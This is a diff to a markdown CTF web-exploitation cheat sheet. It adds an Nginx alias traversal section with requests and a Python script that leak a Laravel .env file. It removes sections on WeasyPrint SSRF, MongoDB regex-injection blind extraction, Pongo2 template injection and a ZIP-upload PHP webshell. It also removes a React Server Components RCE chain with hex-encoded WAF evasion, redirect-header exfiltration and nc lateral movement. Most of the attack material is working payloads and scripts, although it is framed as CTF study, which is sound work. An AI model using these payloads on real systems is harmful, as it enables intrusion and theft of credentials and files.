@@ -8,27 +8,15 @@
   - [Brace Stripping](#brace-stripping)
   - [Double URL Encoding](#double-url-encoding)
   - [Python os.path.join](#python-ospathjoin)
+- [Nginx Alias Traversal to Leak .env (VolgaCTF 2018)](#nginx-alias-traversal-to-leak-env-volgactf-2018)
 - [/dev/fd Symlink to Bypass /proc Filter (Google CTF 2017)](#devfd-symlink-to-bypass-proc-filter-google-ctf-2017)
 - [Unicode Homoglyph Path Traversal U+2E2E (CSAW 2017)](#unicode-homoglyph-path-traversal-u2e2e-csaw-2017)
 - [Ruby Regexp.escape Multibyte Character Bypass (Square CTF 2017)](#ruby-regexpescape-multibyte-character-bypass-square-ctf-2017)
 - [Flask/Werkzeug Debug Mode Exploitation](#flaskwerkzeug-debug-mode-exploitation)
 - [XXE with External DTD Filter Bypass](#xxe-with-external-dtd-filter-bypass)
 - [Path Traversal: URL-Encoded Slash Bypass](#path-traversal-url-encoded-slash-bypass)
-- [WeasyPrint SSRF & File Read (CVE-2024-28184, Nullcon 2026)](#weasyprint-ssrf--file-read-cve-2024-28184-nullcon-2026)
-  - [Variant 1: Blind SSRF via Attachment Oracle](#variant-1-blind-ssrf-via-attachment-oracle)
-  - [Variant 2: Local File Read via file:// Attachment](#variant-2-local-file-read-via-file-attachment)
-- [MongoDB Regex Injection / $where Blind Oracle (Nullcon 2026)](#mongodb-regex-injection--where-blind-oracle-nullcon-2026)
-- [Pongo2 / Go Template Injection via Path Traversal (Nullcon 2026)](#pongo2--go-template-injection-via-path-traversal-nullcon-2026)
-- [ZIP Upload with PHP Webshell (Nullcon 2026)](#zip-upload-with-php-webshell-nullcon-2026)
-- [basename() Bypass for Hidden Files (Nullcon 2026)](#basename-bypass-for-hidden-files-nullcon-2026)
-- [React Server Components Flight Protocol RCE (Ehax 2026)](#react-server-components-flight-protocol-rce-ehax-2026)
-  - [Step 1 — Identify RSC via HTTP headers](#step-1--identify-rsc-via-http-headers)
-  - [Step 2 — Exploit Flight deserialization for RCE](#step-2--exploit-flight-deserialization-for-rce)
-  - [Step 3 — Exfiltrate data via NEXT_REDIRECT](#step-3--exfiltrate-data-via-next_redirect)
-  - [Step 4 — Bypass WAF keyword filters](#step-4--bypass-waf-keyword-filters)
-  - [Step 5 — Post-RCE enumeration](#step-5--post-rce-enumeration)
-  - [Step 6 — Lateral movement to internal services](#step-6--lateral-movement-to-internal-services)
-See also: [server-side-advanced-2.md](server-side-advanced-2.md) for Part 2 (SSRF-to-Docker API RCE, Castor XML xsi:type deserialization, Apache ErrorDocument expression file read, SQLite file path traversal, HQL non-breaking space injection, base64-encoded path traversal, Windows 8.3 short filename bypass, URL parse_url @ symbol bypass, PHP zip:// wrapper LFI, XSS-to-SSTI chain, INSERT INTO column shift SQLi, session cookie forgery via timestamp PRNG).
+
+See also: [server-side-advanced-2.md](server-side-advanced-2.md) for Part 2 (SSRF-to-Docker, Castor XML, Apache ErrorDocument, SQLite path traversal, HQL non-breaking space, base64 path traversal, 8.3 short filename bypass, parse_url @ bypass, PHP zip:// LFI, XSS-to-SSTI, INSERT column shift, session cookie forgery). See also: [server-side-advanced-3.md](server-side-advanced-3.md) for Part 3 (WAV polyglot, multi-slash URL bypass, Xalan math:random, SoapClient CRLF, gopher no-host, SSRF credential leak). See also: [server-side-advanced-4.md](server-side-advanced-4.md) for Part 4 (WeasyPrint SSRF, MongoDB regex injection, Pongo2 SSTI, ZIP PHP webshell, basename() bypass, wget CRLF SMTP, Gopher→MySQL SQLi, React Server Components RCE, AMQP/TLS sslsplit, CairoSVG XXE, Bazaar repo reconstruction).
 
 ---
 
@@ -114,6 +102,61 @@ zip -y exploit.zip file.txt
 
 ### Python os.path.join
 `os.path.join('/app/public', '/etc/passwd')` → `/etc/passwd` (absolute path ignores prefix)
+
+---
+
+### Nginx Alias Traversal to Leak .env (VolgaCTF 2018)
+
+**Pattern:** Nginx `alias` misconfiguration allows path traversal when a `location` block's path doesn't end with `/` but the `alias` does. The path remainder is appended unsafely, allowing `..` traversal out of the aliased directory.
+
+```nginx
+# Vulnerable Nginx configuration:
+location /laravel {
+    alias /var/www/html/public/;
+}
+# Note: /laravel has NO trailing slash, but alias has one
+# This creates a join mismatch: /laravel<anything> maps to /var/www/html/public/<anything>
+```
+
+```bash
+# Exploit: traverse out of the public/ directory to read .env
+GET /laravel../.env HTTP/1.1
+# Nginx resolves: alias "/var/www/html/public/" + "../.env" = /var/www/html/.env
+
+# Read application source
+GET /laravel../app/Http/Controllers/AuthController.php HTTP/1.1
+
+# Read other config files
+GET /laravel../config/database.php HTTP/1.1
+GET /laravel../storage/logs/laravel.log HTTP/1.1
+```
+
+```python
+import requests
+
+target = "http://target"
+
+# Leak Laravel .env file (contains APP_KEY, DB credentials, etc.)
+r = requests.get(f"{target}/laravel../.env")
+if r.status_code == 200:
+    print("[+] .env contents:")
+    print(r.text)
+    # Look for APP_KEY, DB_PASSWORD, API keys, etc.
+```
+
+**Detection checklist:**
+```text
+# Test for the misconfiguration on common paths:
+/static../
+/assets../
+/public../
+/media../
+/uploads../
+/laravel../
+# Any location block using alias without matching trailing slashes
+```
+
+**Key insight:** When an Nginx `location` directive lacks a trailing slash but its `alias` has one, the path is joined unsafely, allowing `..` traversal out of the aliased directory. This is a common misconfiguration in Laravel deployments where `/laravel` maps to the `public/` directory. Always check for trailing slash mismatches between `location` and `alias` directives.
 
 ---
 
@@ -332,263 +375,4 @@ curl 'https://target/public%2f../nginx.conf'
 
 ---
 
-## WeasyPrint SSRF & File Read (CVE-2024-28184, Nullcon 2026)
-
-**Pattern (Web 2 Doc 1/2):** App converts user-supplied URL to PDF using WeasyPrint. Attachment fetches bypass internal header checks and can read local files.
-
-### Variant 1: Blind SSRF via Attachment Oracle
-WeasyPrint `<a rel="attachment" href="...">` fetches the URL in a separate codepath without `X-Fetcher` or similar internal headers. If the target is localhost-only, the attachment fetch succeeds from localhost.
-
-**Boolean oracle:** Embedded file appears in PDF only when target returns HTTP 200:
-```python
-# Check for embedded attachment in PDF
-def has_attachment(pdf_bytes):
-    return b"/Type /EmbeddedFile" in pdf_bytes
-
-# Blind extraction via charCodeAt oracle
-for i in range(flag_len):
-    for ch in charset:
-        html = f'<a rel="attachment" href="http://127.0.0.1:5000/admin/flag?i={i}&c={ch}">A</a>'
-        pdf = convert_url_to_pdf(host_html(html))
-        if has_attachment(pdf):
-            flag += ch; break
-```
-
-### Variant 2: Local File Read via file:// Attachment
-```html
-<!-- Host this HTML, submit URL to converter -->
-<link rel="attachment" href="file:///flag.txt">
-```
-**Extract:** `pdfdetach -save 1 -o flag.txt output.pdf`
-
-**Key insight:** WeasyPrint processes `<link rel="attachment">` and `<a rel="attachment">` -- both can reference `file://` or internal URLs. The attachment is embedded in the PDF as a file stream.
-
----
-
-## MongoDB Regex Injection / $where Blind Oracle (Nullcon 2026)
-
-**Pattern (CVE DB):** Search input interpolated into `/.../i` regex in MongoDB query. Break out of regex to inject arbitrary JS conditions.
-
-**Injection payload:**
-```text
-a^/)||(<JS_CONDITION>)&&(/a^
-```
-This breaks the regex context and injects a boolean condition. Result count reveals truth value.
-
-**Binary search extraction:**
-```python
-def oracle(condition):
-    # Inject into regex context
-    payload = f"a^/)||(({condition}))&&(/a^"
-    html = post_search(payload)
-    return parse_result_count(html) > 0
-
-# Find flag length
-lo, hi = 1, 256
-while lo < hi:
-    mid = (lo + hi + 1) // 2
-    if oracle(f"this.product.length>{mid}"): lo = mid
-    else: hi = mid - 1
-length = lo + 1
-
-# Extract each character
-for i in range(length):
-    l, h = 31, 126
-    while l < h:
-        m = (l + h + 1) // 2
-        if oracle(f"this.product.charCodeAt({i})>{m}"): l = m
-        else: h = m - 1
-    flag += chr(l + 1)
-```
-
-**Detection:** Unsanitized input in MongoDB `$regex` or `$where`. Test with `a/)||true&&(/a` vs `a/)||false&&(/a` -- different result counts confirm injection.
-
----
-
-## Pongo2 / Go Template Injection via Path Traversal (Nullcon 2026)
-
-**Pattern (WordPress Static Site Generator):** Go app renders templates with Pongo2. Template parameter has path traversal allowing rendering of uploaded files.
-
-**Attack chain:**
-1. Upload file containing: `{% include "/flag.txt" %}`
-2. Get upload ID from session cookie (base64 decode, extract hex ID)
-3. Request render with traversal: `/generate?template=../uploads/<id>/pwn`
-
-**Pongo2 SSTI payloads:**
-```text
-{% include "/etc/passwd" %}
-{% include "/flag.txt" %}
-{{ "test" | upper }}
-```
-
-**Detection:** Go web app with template rendering + file upload. Check for `pongo2`, `jet`, or standard `html/template` in source.
-
----
-
-## ZIP Upload with PHP Webshell (Nullcon 2026)
-
-**Pattern (virus_analyzer):** App accepts ZIP uploads, extracts to web-accessible directory, serves extracted files.
-
-**Exploit:**
-```bash
-# Create PHP webshell
-echo '<?php echo file_get_contents("/flag.txt"); ?>' > shell.php
-zip payload.zip shell.php
-curl -F 'zipfile=@payload.zip' http://target/
-# Access: http://target/uploads/<id>/shell.php
-```
-
-**Variants:**
-- If `system()` blocked ("Cannot fork"), use `file_get_contents()` or `readfile()`
-- If `.php` blocked, try `.phtml`, `.php5`, `.phar`, or upload `.htaccess` first
-- Race condition: file may be deleted after extraction -- access immediately
-
----
-
-## basename() Bypass for Hidden Files (Nullcon 2026)
-
-**Pattern (Flowt Theory 2):** App uses `basename()` to prevent path traversal in file viewer, but it only strips directory components. Hidden/dot files in the same directory are still accessible.
-
-**Exploit:**
-```bash
-# basename() allows .lock, .htaccess, etc.
-curl "http://target/?view_receipt=.lock"
-# .lock reveals secret filename
-curl "http://target/?view_receipt=secret_XXXXXXXX"
-```
-
-**Key insight:** `basename()` is NOT a security function -- it only extracts the filename component. It doesn't filter hidden files (`.foo`), backup files (`file~`), or any filename without directory separators.
-
----
-
-## React Server Components Flight Protocol RCE (Ehax 2026)
-
-**Pattern (Flight Risk):** Next.js app using React Server Components (RSC). The Flight protocol deserializes client-sent objects on the server. A crafted fake Flight chunk exploits the constructor chain (`constructor → constructor → Function`) for arbitrary code execution (CVE-2025-55182).
-
-### Step 1 — Identify RSC via HTTP headers
-
-Intercept form submissions in the Network tab. RSC-specific headers:
-```http
-POST / HTTP/1.1
-Next-Action: 7fc5b26191e27c53f8a74e83e3ab54f48edd0dbd
-Accept: text/x-component
-Next-Router-State-Tree: %5B%22%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%5D
-Content-Type: multipart/form-data; boundary=----x
-```
-
-Confirm the server function name in client JS bundles:
-```javascript
-createServerReference("7fc5b26191e27c53f8a74e83e3ab54f48edd0dbd", callServer, void 0, findSourceMapURL, "greetUser")
-```
-
-### Step 2 — Exploit Flight deserialization for RCE
-
-Craft a fake Flight chunk in the multipart form body. The `_prefix` field contains the payload. The constructor chain (`constructor → constructor → Function`) enables arbitrary JavaScript execution on the server.
-
-Request structure:
-```http
-POST / HTTP/1.1
-Host: target
-Next-Action: <action_hash>
-Accept: text/x-component
-Content-Type: multipart/form-data; boundary=----x
-
-------x
-Content-Disposition: form-data; name="0"
-
-THE FAKE FLIGHT CHUNK HERE
-------x
-Content-Disposition: form-data; name="1"
-
-"$@0"
-------x--
-```
-
-### Step 3 — Exfiltrate data via NEXT_REDIRECT
-
-Next.js uses `NEXT_REDIRECT` errors internally for navigation. Abuse this to exfiltrate data through the `x-action-redirect` response header:
-
-```javascript
-throw Object.assign(new Error('NEXT_REDIRECT'), {
-  digest: `NEXT_REDIRECT;push;/login?a=${encodeURIComponent(RESULT)};307;`
-});
-```
-
-The server responds with:
-```http
-HTTP/1.1 303 See Other
-x-action-redirect: /login?a=<exfiltrated_data>;push
-```
-
-Example — confirm RCE with `process.pid`:
-```javascript
-throw Object.assign(new Error('NEXT_REDIRECT'), {
-  digest: `NEXT_REDIRECT;push;/login?a=${process.pid};307;`
-});
-// Response: x-action-redirect: /login?a=1;push
-```
-
-### Step 4 — Bypass WAF keyword filters
-
-When keywords like `child_process`, `execSync`, `mainModule` are blocked (403 response with "WAF Alert"):
-
-1. **String concatenation:**
-   ```javascript
-   p['main'+'Module']['requ'+'ire']('chi'+'ld_pro'+'cess')
-   ```
-
-2. **Hex encoding:**
-   ```javascript
-   '\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73'  // child_process
-   '\x65\x78\x65\x63\x53\x79\x6e\x63'                        // execSync
-   ```
-
-3. **Combined in payload:**
-   ```javascript
-   var p=process;
-   var m=p['main'+'Module'];
-   var r=m['requ'+'ire'];
-   var c=r('\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73');
-   var o=c['\x65\x78\x65\x63\x53\x79\x6e\x63']('id').toString();
-   throw Object.assign(new Error('NEXT_REDIRECT'),
-     {digest:`NEXT_REDIRECT;push;/login?a=${encodeURIComponent(o)};307;`});
-   ```
-
-### Step 5 — Post-RCE enumeration
-
-```javascript
-// Working directory
-process.cwd()                        // → /app
-
-// Process arguments
-process.argv                         // → /usr/local/bin/node,/app/server.js
-
-// List files
-process.mainModule.require('fs').readdirSync(process.cwd()).join(',')
-
-// Read files
-process.mainModule.require('fs').readFileSync('vault.hint').toString('hex')
-
-// Check available modules
-Object.keys(process.mainModule.require('http'))
-```
-
-### Step 6 — Lateral movement to internal services
-
-After discovering internal services (e.g., from hint files):
-```javascript
-// Use nc to reach internal HTTP services
-var p=process;var m=p['main'+'Module'];var r=m['requ'+'ire'];
-var c=r('\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73');
-var o=c['\x65\x78\x65\x63\x53\x79\x6e\x63'](
-  'printf "GET /flag.txt HTTP/1.1\\r\\nHost: internal-vault\\r\\n\\r\\n" | nc internal-vault 9009'
-).toString();
-throw Object.assign(new Error('NEXT_REDIRECT'),
-  {digest:`NEXT_REDIRECT;push;/login?a=${encodeURIComponent(o)};307;`});
-```
-
-**Key insight:** The NEXT_REDIRECT mechanism provides a reliable out-of-band data exfiltration channel through the `x-action-redirect` response header. Combined with WAF bypass via string concatenation and hex encoding, this enables full RCE even in filtered environments.
-
-**Full exploit chain:** Identify RSC headers → craft fake Flight chunk → bypass WAF → achieve RCE → enumerate filesystem → discover internal services → lateral movement via `nc` to retrieve flag.
-
-**Detection:** `Accept: text/x-component` + `Next-Action` header in requests, `createServerReference()` in client JS, Next.js Server Actions with user-controlled form data.
+See [server-side-advanced-4.md](server-side-advanced-4.md) for WeasyPrint SSRF, MongoDB regex injection, Pongo2 SSTI, ZIP PHP webshell, basename() bypass, wget CRLF SMTP, Gopher→MySQL SQLi, React Server Components RCE, AMQP/TLS interception, CairoSVG XXE, and Bazaar repo reconstruction.
